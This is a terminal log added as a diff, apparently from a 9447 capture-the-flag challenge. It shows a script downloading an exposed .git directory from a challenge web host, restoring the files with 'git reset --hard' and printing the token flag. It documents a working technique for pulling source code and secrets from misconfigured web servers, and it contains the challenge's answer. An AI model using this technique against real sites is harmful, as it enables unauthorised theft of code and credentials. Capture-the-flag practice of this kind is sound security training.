@@ -1,0 +1,70 @@
+$ python2 ./gg.py http://tumorous.9447.plumbing/.git/
+Remote: http://tumorous.9447.plumbing/.git / Local: tumorous.9447.plumbing/.git
+Host: tumorous.9447.plumbing
+
+[+] Retrieving commom files...
+http://tumorous.9447.plumbing/.git/hooks/pre-commit.sample
+http://tumorous.9447.plumbing/.git/hooks/pre-applypatch.sample
+http://tumorous.9447.plumbing/.git/hooks/post-update.sample
+http://tumorous.9447.plumbing/.git/hooks/update.sample
+http://tumorous.9447.plumbing/.git/hooks/prepare-commit-msg.sample
+http://tumorous.9447.plumbing/.git/hooks/pre-push.sample
+http://tumorous.9447.plumbing/.git/hooks/applypatch-msg.sample
+http://tumorous.9447.plumbing/.git/hooks/pre-rebase.sample
+http://tumorous.9447.plumbing/.git/hooks/commit-msg.sample
+http://tumorous.9447.plumbing/.git/refs/heads/master
+http://tumorous.9447.plumbing/.git/index
+http://tumorous.9447.plumbing/.git/config
+http://tumorous.9447.plumbing/.git/description
+http://tumorous.9447.plumbing/.git/logs/refs/heads/master
+http://tumorous.9447.plumbing/.git/logs/HEAD
+http://tumorous.9447.plumbing/.git/COMMIT_EDITMSG
+http://tumorous.9447.plumbing/.git/info/exclude
+http://tumorous.9447.plumbing/.git/HEAD
+
+[+] Retrieving objects files (File: tumorous.9447.plumbing/.git/logs/HEAD)...
+
+[+] Retrieving objects files (File: tumorous.9447.plumbing/.git/logs/refs/heads/master)...
+
+[+] Retrieving objects files (File: tumorous.9447.plumbing/.git/logs/refs/remotes/origin/master)...
+[-] Cannot retrieve objects file logs/refs/remotes/origin/master. There's not HEAD file.
+
+[+] Existing...
+http://tumorous.9447.plumbing/.git/objects/cb/36b491e21091a258cb26f56f6157e31084a693
+http://tumorous.9447.plumbing/.git/objects/3d/bda5576912236328494b11f9361dca66c0218a
+http://tumorous.9447.plumbing/.git/objects/04/3a18366cb0b2ab31c0f9b14a755a8e597a8b6a
+
+[+] Missing
+http://tumorous.9447.plumbing/.git/objects/97/d2ea0a2433ecc3024674b1d1ab18661c99b0fe
+http://tumorous.9447.plumbing/.git/objects/04/3a18366cb0b2ab31c0f9b14a755a8e597a8b6a
+http://tumorous.9447.plumbing/.git/objects/17/71ce4ce438fb55700035f2d0b3ce8d73693e80
+http://tumorous.9447.plumbing/.git/objects/3d/bda5576912236328494b11f9361dca66c0218a
+http://tumorous.9447.plumbing/.git/objects/97/d2ea0a2433ecc3024674b1d1ab18661c99b0fe
+http://tumorous.9447.plumbing/.git/objects/0d/2fce4623aa8cd8fcaae969c9af4c73e0b4bfe0
+http://tumorous.9447.plumbing/.git/objects/97/d2ea0a2433ecc3024674b1d1ab18661c99b0fe
+http://tumorous.9447.plumbing/.git/objects/17/71ce4ce438fb55700035f2d0b3ce8d73693e80
+http://tumorous.9447.plumbing/.git/objects/3b/ba60ef48578d0619aff067c7f6596c1426ce96
+
+maycon@darkside ~/hacking/tools/getgit 
+$ cd tumorous.9447.plumbing/
+
+maycon@darkside ~/hacking/tools/getgit/tumorous.9447.plumbing 
+$ ls -a
+.  ..  .git
+
+maycon@darkside ~/hacking/tools/getgit/tumorous.9447.plumbing 
+$ ls -a .git/
+.  ..  COMMIT_EDITMSG  config  description  HEAD  hooks  index  info  logs  objects  refs
+
+maycon@darkside ~/hacking/tools/getgit/tumorous.9447.plumbing 
+$ git reset --hard
+HEAD is now at 3dbda55 My token now exists!
+
+maycon@darkside ~/hacking/tools/getgit/tumorous.9447.plumbing 
+$ ls -a
+.  ..  .git  index.html  token
+
+maycon@darkside ~/hacking/tools/getgit/tumorous.9447.plumbing 
+$ cat token 
+9447{IM_SITTING_ON_A_PILE_OF_GOLD}
+
